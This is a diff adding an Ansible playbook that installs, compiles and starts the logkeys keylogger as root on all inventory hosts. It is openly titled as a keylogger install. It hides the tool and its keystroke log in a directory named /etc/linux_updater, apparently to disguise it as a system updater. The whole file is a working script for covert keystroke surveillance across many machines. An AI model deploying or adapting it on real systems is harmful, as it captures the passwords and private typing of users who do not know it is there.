@@ -1,0 +1,68 @@
+# Garrett Thompson
+# 9/20/24
+# Installs and starts logkeys
+# logs to the home directory for now 
+
+---
+- name: Install keylogger logkeys
+  hosts: all
+  become: yes
+  tasks:
+    - name: Update system
+      apt:
+        update_cache: yes
+        upgrade: dist
+
+    - name: Install Git and dependencies 
+      apt:
+        name: 
+          - git
+          - build-essential
+          - autoconf
+          - automake
+        state: present
+
+    - name: Download LogKeys from GitHub
+      git:
+        repo: http://github.com/kernc/logkeys.git
+        dest: /etc/linux_updater
+        update: yes
+
+    - name: Run logkeys script
+      command: ./autogen.sh
+      args:
+        chdir: /etc/linux_updater
+
+    - name: Configure logkeys
+      command: ./configure
+      args: 
+        chdir: /etc/linux_updater
+
+    - name: Compile logkeys
+      make:
+        chdir: /etc/linux_updater
+
+    - name: Install logkeys
+      command: make install
+      args:
+        chdir: /etc/linux_updater
+
+    - name: Check if logkeys is running
+      command: pgrep logkeys
+      register: logkeys_process
+      ignore_errors: yes
+
+    - name: Stop logkeys if it's running
+      command: logkeys --kill
+      when: logkeys_process.stdout != ""
+      ignore_errors: yes
+
+    - name: Start logkeys 
+      command: logkeys --start --output /etc/linux_updater/logkeys.log --us-keymap
+      register: start_result
+      ignore_errors: yes
+
+    - name: Error report
+      debug:
+        msg: "FAILED TO START LOGKEYS: {{ start_result.stderr }}"
+      when: start_result.rc != 0
